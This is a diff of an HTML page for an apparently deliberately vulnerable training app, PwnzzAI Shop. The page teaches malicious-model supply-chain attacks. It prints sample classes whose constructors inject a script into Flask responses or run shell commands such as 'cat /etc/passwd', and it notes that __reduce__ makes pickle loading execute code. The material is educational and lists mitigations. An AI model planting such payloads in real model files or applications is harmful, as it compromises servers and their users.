@@ -14,13 +14,17 @@
       CONTENT CORRECTIONS (PwnzzAI working group, Afshin):
       1. Removed dead JS block bound to #trigger-model / #vuln-demo-result (elements never existed).
          The XSS demo runs via the /demo-malicious-model link, not that handler.
-      2. Reworded XSS section: it triggers at INFERENCE time via __getattribute__, not on load.
-         Distinguished it from the Bash demo, which triggers at construction/deserialization.
+      2. Trigger timing, re-checked against the code: both payloads live in __init__ and fire when
+         the class is constructed. The XSS class has no __getattribute__ (earlier text and code
+         sample described one); the demo route never calls predict. Unpickling the saved .pkl
+         files runs nothing, because pickle does not call __init__ and the classes define no
+         __reduce__. Code samples now show the real classes.
       3. Fixed "launches a calculator app" -> actual commands (cat /etc/passwd, whoami, uname -a).
       4. Strengthened mitigations: weights_only=True, safetensors, picklescan/ModelScan in CI,
          model signing, internal registry, ML-BOM.
       Open items raised separately as an issue (require backend/redesign, not content):
-        - neither demo deserializes an untrusted FILE (both instantiate server-side)
+        - neither demo deserializes an untrusted FILE (both instantiate server-side), and the
+          saved .pkl files are inert on load; a __reduce__ payload would make them realistic
         - no win condition; no hardened toggle to show the fix neutralising the payload
     -->
 
@@ -57,91 +61,81 @@
                         <div style="flex: 1; min-width: 280px;">
                             <p> To demonstrate this class of vulnerability, we focus on a common but dangerous scenario involving model file formats in frameworks like PyTorch.
                             Files such as .pt, .pth, or .pkl are often assumed to contain only model weights. However, when a model is saved using torch.save() on the entire object&mdash;instead of just the state_dict()&mdash;it serializes both the model data and the underlying Python code.</p>
-                            <p> If an attacker embeds malicious logic in a custom class, that code can run while the object is handled&mdash;either when it is deserialized (<code>pickle.load</code> / <code>torch.load</code> invoke <code>__reduce__</code> / <code>__setstate__</code> / <code>__init__</code>), or later when the model is used for inference. Depending on where the payload is placed, simply loading or simply calling the model can be enough to trigger the attack, potentially leading to arbitrary system commands, data leaks, or full system compromise&mdash;making these files effective Trojan horses.</p>
+                            <p> If an attacker embeds malicious logic in a custom class, that code can run while the object is handled&mdash;either when it is deserialized (<code>pickle.load</code> / <code>torch.load</code> run whatever the file's <code>__reduce__</code> or <code>__setstate__</code> tells them to, though they do not call <code>__init__</code>), when the class is constructed, or later when the model is used for inference. Depending on where the payload is placed, simply loading or simply calling the model can be enough to trigger the attack, potentially leading to arbitrary system commands, data leaks, or full system compromise&mdash;making these files effective Trojan horses.</p>
 
                            <p>At <b>PwnzzAI Shop</b>, we chose to focus on perfecting our pizzas and leaving AI model development to the experts. To analyze customer feedback, we have downloaded the following models from an external repository. Load them into memory, and as you already have access to the code you can inject other malicious routines to it. </p>
-                           <p>The two demos below show <b>two different trigger points</b> for a payload carried by a tampered model: the first fires at <b>inference time</b> (when a prediction method is called), and the second fires at <b>construction/load time</b>. Both arrive through the same broken trust assumption: the model came from outside and was never verified.</p>
+                           <p>The two demos below show <b>two different payloads</b> hidden in a tampered model class: the first injects JavaScript into the web page, the second runs operating system commands on the server. Both sit in the class's <code>__init__</code>, so both fire as soon as the server <b>constructs</b> the model, before any prediction is made. Both arrive through the same broken trust assumption: the model came from outside and was never verified.</p>
+                           <p><b>About the saved files:</b> the <b>Save Model</b> buttons pickle an already-constructed model. Loading those files back with <code>pickle.load</code> does <b>not</b> re-run the payload, because pickle restores the object's fields without calling <code>__init__</code>. A real attacker would add a <code>__reduce__</code> method so that loading the file executes code; scan the saved files with ModelScan to see how scanners judge them.</p>
                         </div>
                         <img style="width: 220px; height: auto; max-width: 100%; flex-shrink: 0;" src="{{ url_for('static', filename='img/supply chain.png') }}" alt="Supply Chain Attack Diagram" class="demonstration-image">
                     </div>
-                <h2>XSS Example (payload fires at inference time)</h2>
-                <p>In this model the <code>SentimentModel_JS_Malicious</code> class carries a JavaScript payload as a field, and overrides <code>__getattribute__</code> so that the payload is injected into the HTTP response <b>when a prediction method (<code>predict</code> / <code>predict_proba</code>) is called</b>, not when the object is created. In other words: loading the object is harmless on its own; using it for inference is what injects the script into the page.</p>
+                <h2>XSS Example (payload fires on construction)</h2>
+                <p>In this model the <code>SentimentModel_JS_malicious</code> class carries a JavaScript payload as a field. Its <code>__init__</code> checks whether it is running inside a Flask request and, if so, registers a hook that rewrites the HTTP response <b>as soon as the object is created</b>. No prediction is needed: the demo page only constructs and trains the model, and the script still ends up in the page.</p>
                 <p>This illustrates that a tampered model can also smuggle an <b>output-handling</b> flaw (stored/reflected XSS, aligned with LLM05 Improper Output Handling) on top of the classic load-time risk. The payload here is illustrative, you can replace it with any other JavaScript to simulate different attack scenarios: exfiltrating data, manipulating the DOM, or stealing cookies.</p>
                 <br><br>
                 <div class="demo-section">
                     <div class="demo-code">
                         <h3>Malicious Model Code</h3>
                         <pre class="code-block">
-class SentimentModel_JS_Malicious:
+class SentimentModel_JS_malicious:
     def __init__(self):
         # Initialize model components
         self.vectorizer = None
         self.model = None
         self.vocab = None
-        <span style="color: red;"># Malicious JavaScript payload (stored as data, not executed here)
-        self.xss_payload = "&lt;script&gt;alert('XSS Vulnerability!');&lt;/script&gt;"</span>
+        <span style="color: red;"># Malicious JavaScript payload
+        self.js_payload = "&lt;script&gt;alert('XSS Vulnerability!');&lt;/script&gt;"</span>
 
-    def __getattribute__(self, name):
-        # Intercept attribute access
-        attr = object.__getattribute__(self, name)
-        <span style="color: red;"># Trigger is INFERENCE-TIME: only when predict/predict_proba is called</span>
-        if name in ['predict', 'predict_proba']:
-            def wrapper(*args, **kwargs):
-                result = attr(*args, **kwargs)
-                # Try to inject in Flask context
-                try:
-                    from flask import g, after_this_request
-                    g.xss_payload = self.xss_payload
-
-                     <span style="color: red;"># Hook into the response cycle and inject into HTML
-                    @after_this_request
-                    def inject_xss(response):
-                        if 'text/html' in response.content_type:
-                            response.data = response.data.replace(
-                                b'&lt;/body&gt;',
-                                f'{self.xss_payload}&lt;/body&gt;'.encode()
-                            )
-                        return response</span>
-                except:
-                    pass
-                return result
-            return wrapper
-        return attr</pre>
+        # Runs at construction time, inside any Flask request
+        try:
+            from flask import after_this_request, has_request_context
+            if has_request_context():
+                <span style="color: red;"># Hook into the response cycle and inject into HTML
+                @after_this_request
+                def inject_malicious_code(response):
+                    if 'text/html' in response.content_type:
+                        data = response.get_data(as_text=True)
+                        response.set_data(data.replace(
+                            '&lt;/body&gt;', f'{self.js_payload}&lt;/body&gt;'))
+                    return response</span>
+        except Exception:
+            pass
+        .....</pre>
                     </div>
 
                     <div class="demo-explanation">
                         <h3>How It Works</h3>
-                        <p>This malicious model overrides the <code>__getattribute__</code> method to intercept calls to prediction functions. When these functions are called in a Flask application, it:</p>
+                        <p>This malicious model hides its payload in the constructor. When it is created inside a Flask application, it:</p>
                         <ol>
-                            <li>Performs normal prediction functionality, so nothing looks wrong</li>
+                            <li>Sets up normal-looking model components and trains as usual, so nothing looks wrong</li>
                             <li>Hooks into Flask's response system using <code>after_this_request</code></li>
                             <li>Injects JavaScript into the HTML response <b>before it is returned to the user</b></li>
                             <li>The injected code could steal cookies, redirect users, or perform other malicious actions</li>
                         </ol>
-                        <p><b>Note the trigger:</b> this payload executes at <b>inference time</b> (on <code>predict</code>), not when the model file is loaded. Contrast this with the OS command example below, which runs as soon as the object is constructed.</p>
+                        <p><b>Note the trigger:</b> this payload executes when the model object is <b>constructed</b> during a web request, not when <code>predict</code> is called. The OS command example below uses the same trigger point with a more dangerous payload.</p>
 
                         <div class="live-demo">
                             <h3>Live Demonstration</h3>
-                            <p>Click the button below to load a page that creates an instance of a malicious model and calls it. </p>
+                            <p>Click the button below to load a page that creates an instance of the malicious model. </p>
                             <p> You can also save the model as a pickle file and scan it with model scanners to learn more. </p>
                             <a href="/demo-malicious-model" class="demo-btn" target="_blank">Load Malicious Model</a>
                             <button id="save-js-model" class="demo-btn secondary-btn">Save Model</button>
                             <div class="demo-info">
-                                <p><i class="fas fa-info-circle"></i> This opens a new page where the model is instantiated and used, injecting JavaScript into the response.</p>
+                                <p><i class="fas fa-info-circle"></i> This opens a new page where the model is instantiated and trained (no prediction is made); the JavaScript is injected into the response. View the page source to find it before <code>&lt;/body&gt;</code>.</p>
                                 <div id="js-save-result" class="save-result"></div>
                             </div>
                         </div>
                     </div>
                 </div>
 
-                <h2>OS Command Execution Example (payload fires on load/construction)</h2>
-                <p>This model executes operating system commands as soon as the object is constructed&mdash;which is exactly what happens during <code>pickle.load</code> / <code>torch.load</code> of a whole-object serialization. This is the classic supply-chain deserialization case:</p>
+                <h2>OS Command Execution Example (payload fires on construction)</h2>
+                <p>This model executes operating system commands as soon as the object is constructed. In a real supply-chain attack the same code would sit in a <code>__reduce__</code> method, so that <code>pickle.load</code> / <code>torch.load</code> of a whole-object file runs it; here the server constructs the class directly, which reaches the same result:</p>
 
                 <div class="demo-section">
                     <div class="demo-code">
                         <h3>OS Attack Model</h3>
                         <pre class="code-block">
-class SentimentModel_Bash_Malicious:
+class SentimentModel_bash_malicious:
 
     def __init__(self):
         # Initialize model components
@@ -149,7 +143,7 @@ class SentimentModel_Bash_Malicious:
         self.model = None
         self.vocab = None
         self.executed_commands = []
-        <span style="color: red;"># Runs at construction/deserialization time
+        <span style="color: red;"># Runs at construction time
         commands_to_execute = [
             "cat /etc/passwd",
             "whoami",
@@ -180,9 +174,9 @@ class SentimentModel_Bash_Malicious:
                         <h3>How It Works</h3>
                         <p>This malicious model executes operating system commands when instantiated:</p>
                         <ol>
-                            <li>The model contains normal neural network layers to appear legitimate</li>
+                            <li>The model contains normal-looking scikit-learn sentiment components to appear legitimate</li>
                             <li>Its <code>__init__</code> method contains code that executes shell commands</li>
-                            <li>When the model is loaded (via PyTorch or pickle), the commands run automatically&mdash;no inference call is needed</li>
+                            <li>When the server creates the model, the commands run automatically&mdash;no inference call is needed</li>
                             <li>In this example it runs <code>cat /etc/passwd</code>, <code>whoami</code>, and <code>uname -a</code>, but it could execute any arbitrary command</li>
                         </ol>
 
